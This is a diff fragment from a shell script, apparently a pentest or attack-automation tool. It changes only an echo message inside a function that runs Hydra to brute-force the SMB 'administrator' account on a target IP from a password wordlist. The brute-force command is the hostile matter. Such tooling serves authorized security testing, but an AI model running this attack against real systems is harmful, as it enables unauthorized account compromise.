@@ -24,7 +24,7 @@ scan_port() {
 # Fonction pour effectuer une attaque Hydra
 hydra_attack() {
     local target_ip="$1"
-    echo "Performing Hydra attack on $target_ip using /wordlists/rockyou.txt..."
+    echo "Performing Hydra attack on $target_ip using /wordlists/rockyou.txt"
     local attack_results=$(hydra -l administrator -P /usr/share/wordlists/john.txt smb://$target_ip -t 4 -vV)
     echo "$attack_results"
     
